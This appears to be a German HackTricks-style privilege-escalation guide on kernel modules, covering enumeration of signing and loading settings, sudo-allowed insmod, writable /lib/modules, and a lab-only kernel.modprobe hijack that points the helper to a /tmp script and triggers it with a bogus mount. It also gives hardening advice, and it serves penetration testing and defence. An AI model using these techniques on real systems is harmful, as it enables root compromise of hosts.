# Missbrauch von Kernelmodulen und modprobe

## Fehlkonfigurationen bei Kernelmodulen und dem Laden von Modulen

Die Unterstützung für Kernelmodule ist ein Bereich mit hohem Einfluss bei der Überprüfung auf Linux-Privilege-Escalation. Behandle nicht jede Meldung zu unsignierten Modulen automatisch als ausnutzbar, sondern nutze sie, um praktische Fragen zu beantworten.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kann der aktuelle Benutzer Module über `sudo`, Capabilities oder einen beschreibbaren Helper-Pfad laden?
- Ist das Laden von Modulen weiterhin aktiviert?
- Ist die Erzwingung von Modulsignaturen deaktiviert?
- Sind Modulverzeichnisse oder Moduldateien beschreibbar?
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Eine schnelle Triage beginnt mit den folgenden Prüfungen des Modulstatus, der Signatur, der Protokollierung und des Modulbaums.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretation:

- `modules_disabled=1` bedeutet, dass Module weder geladen noch entladen werden können und der Wert bis zum Neustart nicht auf `0` zurückgesetzt werden kann.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` in der Kernel-Befehlszeile oder `CONFIG_MODULE_SIG_FORCE=y` erfordert gültig signierte Module; andernfalls können unsignierte Module geladen werden und den Kernel als „tainted“ markieren.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` legt keine Einschränkung für `dmesg` fest; bei `1` ist für den Zugriff `CAP_SYSLOG` erforderlich.<sup>[[1]](#references)</sup>
- Beschreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, da `modprobe` beim Laden von Modulen diesen Verzeichnisbaum und dessen Abhängigkeitsdaten durchsucht.<sup>[[8]](#references)</sup>

### Laden eines Moduls und Lesen der Kernel-Ausgabe

Wenn du die rechtmäßige Berechtigung hast, ein lokales Modul zu laden, fügt `insmod` die von dir angegebene `.ko`-Datei exakt ein. Die Init-Funktion des Moduls wird als Teil des Ladevorgangs ausgeführt, und mit `printk()` geschriebene Meldungen werden in den Kernel-Logpuffer geschrieben, der normalerweise mit `dmesg` gelesen wird.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ein minimaler Prüfablauf verwendet `modinfo` zur Untersuchung von Metadaten, `insmod` und `rmmod` zum Laden und Entfernen eines Moduls, `lsmod` zur Bestätigung des geladenen Zustands und `dmesg` zur Untersuchung der Kernel-Logs.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper darum erlaubt, ist dies als kritisch einzustufen: `sudo -l` listet die Berechtigungen des aufrufenden Benutzers auf, und das Laden eines Kernelmoduls erfordert `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Eine sudo-Regel, die einem Benutzer erlaubt, `insmod` auszuführen, ist nicht damit vergleichbar, einen normalen administrativen Helfer zuzulassen. Der Initialisierungscode des Moduls wird als Teil des Einfügens ausgeführt. Daher lautet die praktische Prüfungsfrage, ob dieser Benutzer das zu ladende Modul auswählen oder verändern kann.<sup>[[3]](#references)</sup>

Der folgende allgemeine Prüfungsablauf wiederholt für ein potenzielles Modul die Prüfungen von Inspektion, Laden, Status, Protokollen und Entfernung.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Wenn der Benutzer ein beliebiges `.ko` bereitstellen kann, sollte die Regel bei einer autorisierten Prüfung als vollständige Systemkompromittierung behandelt werden. Ein sichereres Vorgehen besteht darin, das Laden von Modulen nicht über sudo zu delegieren. Falls dies unvermeidbar ist, sollten der exakte Pfad, Eigentümer, Berechtigungen, die Signaturregelung und der Ablauf zur Entfernung eingeschränkt werden.<sup>[[3]](#references)[[10]](#references)</sup>

Für ein harmloses Muster zum Erstellen von Modulen in einer kontrollierten Laborumgebung werden unten ein minimaler Quelltext und ein Makefile gezeigt. Die Form `make -C /lib/modules/$(uname -r)/build M=$PWD` folgt dem dokumentierten kbuild-Workflow des Kernels für externe Module.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Nur in einem autorisierten Labor bauen und laden; kbuild erstellt das externe Modul, und die Befehle zum Laden/Entfernen greifen auf die Schnittstellen für Kernelmodule zu.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path`-Missbrauchsprüfungen

`kernel.modprobe` benennt den Userspace-Helfer, den der Kernel für Anforderungen zum automatischen Laden von Modulen ausführt; dieses sysctl beeinflusst das automatische Laden, nicht das explizite Einfügen von Modulen. Wenn ein Angreifer den Wert auf einen beschreibbaren Pfad zu einer ausführbaren Datei ändern und eine Modulanforderung auslösen kann, wird dieser Helfer zu einem privilegierten Code-Execution-Pfad.<sup>[[1]](#references)</sup>

Prüfe den aktuellen Helferpfad über die Kernel-sysctl-Schnittstelle und untersuche den Eigentümer und die Berechtigungen des Ziels.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Prüfe, ob die sysctl-, delegierten sudo-Regeln oder File-Capabilities beeinflusst werden können.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Das folgende, nur für Labs vorgesehene Muster ändert den Pfad des Helpers und löst eine dokumentierte Anforderung zum automatischen Laden eines Moduls aus; verwenden Sie es nur auf einem isolierten, autorisierten System.<sup>[[1]](#references)</sup>

Verwenden Sie auf aktuellen Linux-Kernels keine unbekannte ausführbare Datei als generischen Trigger: Das automatische Laden von Modulen für alte benutzerdefinierte Binärformate wurde in Linux 6.14 entfernt, während die Kernel-Dokumentation einen unbekannten Dateisystemtyp als Pfad für eine Anforderung zum automatischen Laden eines Moduls identifiziert.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Auf gehärteten Systemen sollte dies fehlschlagen, wenn Berechtigungen nicht privilegierte Schreibzugriffe auf `kernel.modprobe` verhindern, der Pfad zum Helper nicht beschreibbar ist oder das automatische Laden von Modulen deaktiviert ist.<sup>[[1]](#references)</sup>

### Prüfung von beschreibbarem `/lib/modules`

Beschreibbare Modulverzeichnisse können je nach späterem Aufruf von `modprobe` den Austausch von Modulen, das Platzieren schädlicher Module oder den Missbrauch des automatischen Ladens ermöglichen; `modprobe` durchsucht `/lib/modules/$(uname -r)` und verwendet beim Auflösen von Modulen dessen Abhängigkeitsdaten.<sup>[[8]](#references)</sup>

Prüfe beschreibbare Moduldateien sowie Abhängigkeits- und Alias-Metadaten im Modulbaum des aktiven Kernel-Releases.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Wenn du beschreibbare Modulinhalte findest, untersuche, wie `modprobe` Abhängigkeiten auflöst und wie `modinfo` Metadaten von Modulen meldet.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensive Hinweise:

- Belasse `/lib/modules` im Besitz von `root:root` und nicht durch Benutzer beschreibbar.<sup>[[8]](#references)</sup>
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.<sup>[[1]](#references)</sup>
- Erzwinge die Signierung von Modulen auf Systemen, die ladbare Module benötigen.<sup>[[2]](#references)</sup>
- Überwache Schreibvorgänge nach `/proc/sys/kernel/modprobe`, `/lib/modules` sowie unerwartete Ausführungen von `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [Dokumentation für /proc/sys/kernel/ — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Signierungsfunktion für Kernel-Module — Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Grundlagen von Treibern — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Nachrichtenprotokollierung mit printk — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Erstellen externer Module — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge-Tag „execve-v6.14-rc1“ — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
{{#include ../../banners/hacktricks-training.md}}
